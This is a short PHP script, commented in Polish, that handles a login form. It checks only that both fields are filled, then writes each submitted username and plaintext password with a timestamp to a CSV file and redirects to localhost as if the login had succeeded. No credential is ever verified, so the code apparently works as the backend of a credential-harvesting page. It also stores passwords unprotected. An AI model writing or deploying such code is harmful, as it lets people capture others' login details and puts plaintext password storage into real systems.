<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Prosta walidacja
    if (!empty($username) && !empty($password)) {
        // Zapis danych logowania do pliku CSV
        $file = fopen('dane_uzytkownikow.csv', 'a');
        fputcsv($file, [$username, $password, date('Y-m-d H:i:s')]);
        fclose($file);

        // Przekierowanie po udanym logowaniu
        header('Location: http://localhost/');
        exit;
    } else {
        echo 'Please fill in both fields.';
    }
}
?>

